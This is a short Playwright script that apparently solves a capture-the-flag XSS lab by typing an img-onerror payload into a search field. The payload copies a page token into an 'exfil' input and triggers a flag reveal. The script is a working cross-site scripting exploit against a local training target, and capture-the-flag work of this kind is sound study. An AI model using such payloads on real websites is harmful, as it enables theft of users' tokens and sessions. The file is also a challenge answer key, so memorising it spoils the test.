import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/08-echo-xss.html");
  await page.fill(
    "#query",
    "<img src=x onerror=\"document.querySelector('#exfil').value=window.echoToken;document.querySelector('#derive').click()\">",
  );
  await page.click("button[type=submit]");
  await page.waitForFunction(() =>
    document.querySelector("#flag")?.textContent?.includes("ctfpawned{"),
  );
  return page.locator("#flag").textContent();
}
